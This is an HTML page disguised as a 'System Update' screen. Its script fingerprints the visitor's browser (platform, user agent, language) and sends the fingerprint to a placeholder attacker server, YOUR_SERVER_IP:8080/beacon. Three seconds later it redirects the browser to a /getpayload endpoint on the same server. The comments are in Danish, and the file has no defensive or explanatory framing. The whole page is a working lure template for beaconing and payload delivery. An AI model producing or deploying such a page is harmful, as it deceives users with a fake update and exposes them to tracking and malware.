<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>System Update</title>
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    h1 {
      animation: blink 1.5s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <h1>Applying system update...</h1>

  <script>
    // Generér fingerprint
    let fp = navigator.platform + "_" + navigator.userAgent.split(" ")[0] + "_" + navigator.language;

    // Send fingerprint til backend
    fetch("http://YOUR_SERVER_IP:8080/beacon", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fingerprint: fp })
    });

    // Vent 3 sekunder og forsøg at hente payload (hvis tilladt)
    setTimeout(() => {
      window.location.href = `http://YOUR_SERVER_IP:8080/getpayload?fp=${fp}`;
    }, 3000);
  </script>
</body>
</html>
